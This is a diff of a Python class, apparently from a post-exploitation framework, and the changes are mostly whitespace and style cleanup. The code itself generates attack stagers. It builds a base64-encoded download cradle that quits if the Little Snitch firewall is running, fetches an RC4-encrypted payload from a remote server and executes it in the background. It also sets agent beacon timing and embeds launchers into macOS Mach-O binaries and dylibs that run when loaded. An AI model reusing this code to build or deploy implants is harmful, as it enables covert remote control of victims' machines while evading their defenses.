@@ -30,7 +30,7 @@ class Stagers:
 
         # pull out the code install path from the database config
         cur = self.conn.cursor()
-        
+
         cur.execute("SELECT install_path FROM config")
         self.installPath = cur.fetchone()[0]
 
@@ -46,25 +46,23 @@ class Stagers:
 
         self.load_stagers()
 
-
     def load_stagers(self):
         """
         Load stagers from the install + "/lib/stagers/*" path
         """
-        
+
         rootPath = self.installPath + 'lib/stagers/'
         pattern = '*.py'
-         
+
         for root, dirs, files in os.walk(rootPath):
             for filename in fnmatch.filter(files, pattern):
                 filePath = os.path.join(root, filename)
-                
+
                 # extract just the module name from the full path
                 stagerName = filePath.split("/lib/stagers/")[-1][0:-3]
 
                 # instantiate the module and save it to the internal cache
                 self.stagers[stagerName] = imp.load_source(stagerName, filePath).Stager(self.mainMenu, [])
-
 
     def set_stager_option(self, option, value):
         """
@@ -72,10 +70,9 @@ class Stagers:
         """
 
         for name, stager in self.stagers.iteritems():
-            for stagerOption,stagerValue in stager.options.iteritems():
+            for stagerOption, stagerValue in stager.options.iteritems():
                 if stagerOption == option:
                     stager.options[option]['Value'] = str(value)
-
 
     def generate_stager(self, server, key, profile, encrypt=True, encode=False):
         """
@@ -96,7 +93,8 @@ class Stagers:
         randomHeader = "%s='%s'\n" % (helpers.random_string(), helpers.random_string())
         stager = randomHeader + stager
 
-        if server.endswith("/"): server = server[0:-1]
+        if server.endswith("/"):
+            server = server[0:-1]
 
         # # patch the server and key information
         stager = stager.replace("REPLACE_SERVER", server)
@@ -116,10 +114,9 @@ class Stagers:
             # otherwise return the case-randomized stager
             return stager
 
-
     def generate_stager_hop(self, server, key, profile, encrypt=True, encode=True):
         """
-        Generate the Python stager for hop.php redirectors that 
+        Generate the Python stager for hop.php redirectors that
         will perform key negotiation with the server and kick off the agent.
         """
 
@@ -152,11 +149,10 @@ class Stagers:
             # otherwise return the case-randomized stager
             return stager
 
-
     def generate_agent(self, delay, jitter, profile, killDate, workingHours, lostLimit):
         """
         Generate "standard API" functionality, i.e. the actual agent.py that runs.
-        
+
         This should always be sent over encrypted comms.
         """
 
@@ -170,20 +166,19 @@ class Stagers:
         b64DefaultPage = base64.b64encode(http.default_page())
 
         # patch in the delay, jitter, lost limit, and comms profile
-        code = code.replace('delay = 60', 'delay = %s' %(delay))
-        code = code.replace('jitter = 0.0', 'jitter = %s' %(jitter))
-        code = code.replace('profile = "/admin/get.php,/news.asp,/login/process.jsp|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', 'profile = "%s"' %(profile))
-        code = code.replace('lostLimit = 60', 'lostLimit = %s' %(lostLimit))
-        code = code.replace('defaultPage = base64.b64decode("")', 'defaultPage = base64.b64decode("%s")' %(b64DefaultPage))
+        code = code.replace('delay = 60', 'delay = %s' % (delay))
+        code = code.replace('jitter = 0.0', 'jitter = %s' % (jitter))
+        code = code.replace('profile = "/admin/get.php,/news.asp,/login/process.jsp|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"', 'profile = "%s"' % (profile))
+        code = code.replace('lostLimit = 60', 'lostLimit = %s' % (lostLimit))
+        code = code.replace('defaultPage = base64.b64decode("")', 'defaultPage = base64.b64decode("%s")' % (b64DefaultPage))
 
         # patch in the killDate and workingHours if they're specified
         if killDate != "":
-            code = code.replace('killDate = ""', 'killDate = "%s"' %(killDate))
+            code = code.replace('killDate = ""', 'killDate = "%s"' % (killDate))
         if workingHours != "":
-            code = code.replace('workingHours = ""', 'workingHours = "%s"' %(killDate))
+            code = code.replace('workingHours = ""', 'workingHours = "%s"' % (killDate))
 
         return code
-
 
     def generate_launcher_uri(self, server, encode=True, pivotServer="", hop=False):
         """
@@ -207,7 +202,6 @@ class Stagers:
 
         return server + checksum
 
-
     def generate_launcher(self, listenerName, encode=True, userAgent="default", proxy="default", proxyCreds="default"):
         """
         Generate the initial Python 'download cradle' with a specified
@@ -218,7 +212,7 @@ class Stagers:
         userAgent ->    "default" uses the UA from the default profile in the database
                         "none" sets no user agent
                         any other text is used as the user-agent
-        proxy ->        "default" uses the default system proxy 
+        proxy ->        "default" uses the default system proxy
                         "none" sets no proxy
                         any other text is used as the proxy
 
@@ -258,10 +252,10 @@ class Stagers:
         launcherBase += "if re.search(\"Little Snitch\", out):\n"
         launcherBase += "   sys.exit()\n"
         launcherBase += "o=__import__({2:'urllib2',3:'urllib.request'}[sys.version_info[0]],fromlist=['build_opener']).build_opener();"
-        launcherBase += "UA='%s';" %(userAgent)
+        launcherBase += "UA='%s';" % (userAgent)
         launcherBase += "o.addheaders=[('User-Agent',UA)];"
-        launcherBase += "a=o.open('%s').read();" %(stage0uri)
-        launcherBase += "key='%s';" %(stagingKey)
+        launcherBase += "a=o.open('%s').read();" % (stage0uri)
+        launcherBase += "key='%s';" % (stagingKey)
         # RC4 decryption
         launcherBase += "S,j,out=range(256),0,[]\n"
         launcherBase += "for i in range(256):\n"
@@ -279,15 +273,14 @@ class Stagers:
         if encode:
             launchEncoded = base64.b64encode(launcherBase)
             # launcher = "python -c \"import sys,base64;exec(base64.b64decode('%s'));\"" %(launchEncoded)
-            launcher = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python &" %(launchEncoded)
+            launcher = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python &" % (launchEncoded)
             return launcher
         else:
             return launcherBase
 
-
     def generate_hop_php(self, server, resources):
         """
-        Generates a hop.php file with the specified target server 
+        Generates a hop.php file with the specified target server
         and resource URIs.
         """
 
@@ -297,7 +290,8 @@ class Stagers:
         f.close()
 
         # make sure the server ends with "/"
-        if not server.endswith("/"): server += "/"
+        if not server.endswith("/"):
+            server += "/"
 
         # patch in the server and resources
         hop = hop.replace("REPLACE_SERVER", server)
@@ -305,8 +299,7 @@ class Stagers:
 
         return hop
 
-
-    def generate_macho(self,launcherCode):
+    def generate_macho(self, launcherCode):
 
         """
         Generates a macho binary with an embedded python interpreter that runs the launcher code
@@ -322,7 +315,7 @@ class Stagers:
             print helpers.color("[!] Macho binary template is not the correct filetype")
             return ""
 
-        cmds = macho.headers[0].commands 
+        cmds = macho.headers[0].commands
 
         for cmd in cmds:
             count = 0
@@ -347,10 +340,9 @@ class Stagers:
         else:
             print helpers.color("[!] Unable to patch MachO binary")
 
-
-    def generate_dylib(self,launcherCode,arch):
+    def generate_dylib(self, launcherCode, arch):
         """
-        Generates a dylib with an embedded python interpreter and runs launcher code when loaded into an application. 
+        Generates a dylib with an embedded python interpreter and runs launcher code when loaded into an application.
         """
         import macholib.MachO
 
@@ -363,16 +355,16 @@ class Stagers:
 
         if int(macho.headers[0].header.filetype) != MH_DYLIB:
             print helpers.color("[!] Dylib template is not the correct filetype")
-            return ""            
+            return ""
 
-        cmds = macho.headers[0].commands 
+        cmds = macho.headers[0].commands
 
         for cmd in cmds:
             count = 0
             if int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64 or int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT:
                 count += 1
                 if cmd[count].segname.strip('\x00') == '__TEXT' and cmd[count].nsects > 0:
-                    count += 1 
+                    count += 1
                     for section in cmd[count]:
                         if section.sectname.strip('\x00') == '__cstring':
                             offset = int(section.offset)
@@ -387,4 +379,4 @@ class Stagers:
 
             return patchedDylib
         else:
-            print helpers.color("[!] Unable to patch dylib") 
+            print helpers.color("[!] Unable to patch dylib")
